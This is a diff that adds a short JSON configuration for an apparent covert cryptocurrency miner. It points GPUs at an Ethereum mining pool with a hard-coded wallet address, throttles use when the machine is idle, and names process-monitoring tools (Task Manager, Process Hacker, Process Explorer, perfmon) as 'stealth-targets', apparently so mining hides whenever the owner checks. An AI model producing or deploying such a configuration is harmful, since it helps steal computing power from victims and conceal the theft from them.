@@ -1,0 +1,9 @@
+{
+    "url": "stratum://`0x7cB769a9CcE68c1312864d31ebB1FB1aBA9eb0Bc`.0x7cB769a9CcE68c1312864d31ebB1FB1aBA9eb0Bc@eu1.ethermine.org:4444",
+    "algo": "ethash",
+    "max-gpu": 30,
+    "idle-wait": 2,
+    "idle-gpu": 70,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": ""
+}
